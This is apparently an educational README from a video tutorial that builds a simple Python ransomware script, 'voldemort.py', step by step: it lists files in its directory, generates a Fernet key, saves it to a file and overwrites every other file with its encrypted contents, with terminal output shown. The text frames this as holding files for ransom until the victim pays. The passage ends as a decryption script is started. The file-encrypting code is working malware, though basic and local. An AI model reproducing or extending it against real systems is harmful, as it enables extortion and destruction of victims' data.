# Ransomware

This is an example application featured in NetworkChuck's <a href="https://youtu.be/UtMMjXOlRQc">Python Malware Tutorial</a>.

### Instructions

**Step 1:**
Make a folder called ``ransomware`` and create a few random ``.txt`` files with some silly phrases in them:

<pre>
<code>$ mkdir ransomware
$ cd ransomware
$ echo "This is a file" > file.txt
$ echo "Leave me alone" > file2.txt
$ echo "Another one" > hey.txt
$ echo "One more time" > pleasedonthurtme.txt</code>
</pre>

Now let's hold these files for ransom! Let's encrypt those suckers right now! Here we go:

<pre>
<code>$ nano voldemort.py</code>
</pre>

Write this code in the following ``voldemort.py`` file:

<details>
<summary>💰 How to Hold These Files for Ransom:</summary>

```python
#!/usr/bin/env python3
import os

# Let's find some files!
files = []

for file in os.listdir():
    if file == "voldemort.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

```
</details>

When you first run ``voldemort.py`` in your terminal, you should see the following output:

<pre>
<code>$ python voldemort.py
['file2.txt', 'file.txt', 'hey.txt', 'pleasedonthurtme.txt']</code>
</pre>

**Step 2:**
Now let's encrypt those files! Start it off by running the following command:

<pre>
<code>$ nano voldemort.py</code>
</pre>

Add more code to ``voldemort.py``:

<details>
<summary>🔒 How to Encrypt These Files:</summary>

```python
#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

# Let's find some files!
files = []

for file in os.listdir():
    if file == "voldemort.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()

print(key)

```
</details>

When you next run ``voldemort.py``, you should see the following output for your key:

<pre>
<code>$ python voldemort.py
['file2.txt', 'file.txt', 'hey.txt', 'pleasedonthurtme.txt']
b'nDcZ_UIVfpECWw2ezj2T4RKHg7i_7ARgMtHXEVxarfQ='</code>
</pre>

**Step 3:**
Obviously, we don't want to print our key right out there in the open where the user can see it. We want the user to give us money, but we do need to save the key into another file for safety so we can unlock the files later *after* we get paid 😉:

<pre>
<code>$ nano voldemort.py</code>
</pre>

Add more code to ``voldemort.py``:

<details>
<summary>🔑 How to Save the Key:</summary>

```python
#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

# Let's find some files!
files = []

for file in os.listdir():
    if file == "voldemort.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

```
</details>

Run ``voldemort.py`` and you should see the following output:

<pre>
<code>$ python voldemort.py
['file2.txt', 'file.txt', 'hey.txt', 'pleasedonthurtme.txt']</code>
</pre>

Wait, where is ``thekey.key``? Don't worry! It is still hidden and we can finally view it by entering the following commands:

<pre>
<code>$ ls
file.txt             hey.txt              thekey.key
file2.txt            pleasedonthurtme.txt voldemort.py
$ cat thekey.key
l-4zrPy0VkR8pDJnGvsxyy2UEXGiV0AKkpEQR-fzD14=%</code>
</pre>

**Step 4:**
Now this is where things start to get interesting. We will be pushing our ``thekey.key`` file into the code for our ``voldemort.py`` file so that all the other files will be encrypted. In other words, the poor user can now only see those files as gibberish:

<pre>
<code>$ nano voldemort.py</code>
</pre>

Add the following code to ``voldemort.py``:

<details>
<summary>👁️👄👁️ How to Make These Files Come Out as Garble:</summary>

```python
#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

# Let's find some files!
files = []

for file in os.listdir():
    if file == "voldemort.py" or file == "thekey.key":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

```
</details>

Make one quick goodbye to each ``.txt`` file before they get encrypted by your mom:

<pre>
<code>$ cat file.txt
This is a file
$ cat file2.txt
Leave me alone
$ cat hey.txt
Another one
$ cat pleasedonthurtme.txt
One more time</code>
</pre>

Run ``voldemort.py`` and you should see the following output:

<pre>
<code>$ python voldemort.py
['file2.txt', 'file.txt', 'hey.txt', 'pleasedonthurtme.txt']</code>
</pre>

This is the moment we've all been waiting for. Now all these ``.txt`` files have been left in ruins 😈:

<pre>
<code>$ cat file.txt
gAAAAABo9_vsmrW0ocPft7966tBWfmDGPGuULoBZLck3RAbj2MPsLUWLoErkInZD5hWc4MVuuBzs99_EzxOvVCckm1kSqq27hhhO0Atscgp6N4Y73BcN6nIJ9hV0Lf6TcccX0b4NQxdOHP0vFXQ4wHA8eipTaASBhfl_02kekjYlbtDo5fOhWPnO8mDwYHcrxrblkOQwmvhm9_kwUKShDc4Ign2bk1D72A==%
$ cat file2.txt
gAAAAABo9_vsnw_nYyQ_29Z-Ol9W322Qf6hScuHtGS6YgB8A1mik3dlDoKi11PrfFGDIoDr22ddLw-yeT3D-dulUuvQBz-t0LB02vJhdmjJFBgLUCYl0FajFaIyYXb31dkrUlYLoSuG7FPchBeT4EG6-1lllQFbV9QBQlKsPXNZOLU6j551Q54Kg4XhpHPTEuym02dZaC0YOIn7B5hFFj8EtROpXKqqDHw==%
$ cat hey.txt
gAAAAABo9_vsLnZX08uVJR-veRrK-SNBhBLB3oLAhxl850VmOYnSGTkjLoPmHzNGKmjbZNBcOMMUUxLUKpN50_XdErY_C-TmzgMD_O6pzhllzdzZ-kYL8zKEgDI7VSAsSTsRkY12-kNpcLuQnvQz_7KDCqFXE6N-605rrYo0tQr2gd5RIp2_IoyHJBWT1etHcMSjkJ3u8IXLhcf3_h6-9RHkMlRTFkxFFQ==%
$ cat pleasedonthurtme.txt
gAAAAABo9_vsBkcYTvBVAh46_xe24bRQtPJLbmbZj2RQhzY6XFW5NtPQZukDfkAkzyH-KDu5rrnAhd1dZjGKjtNM7VR3U_DZs8-FtHKCU2MbjfpTeA59CJel17U577amMDzeiJV5RWF0L4CTXBwR1a8_4TRdTKNReT7DP4nzIc73iprGF9qqjQbPOJJmBVofby7mbYmRJCC9F53KMvd-NM9xFhyfu-q8uA==%</code>
</pre>

Fortunately for us hackers, we have a new ``thekey.key`` and that is the key to unlocking these files:

<pre>
<code>$ cat thekey.key
uGb51hGWiq-3FEslUhjYNDn2HBWs8JXl-X1RHUqiiSw=%</code>
</pre>

**Step 5:**
Now we can unlock all these files once and for all by writing a ``decrypt.py`` file. Luckily, it is already very similar to the ``voldemort.py`` (AKA encrypting) file:

<pre>
<code>$ cp voldemort.py decrypt.py
$ nano decrypt.py</code>
</pre>
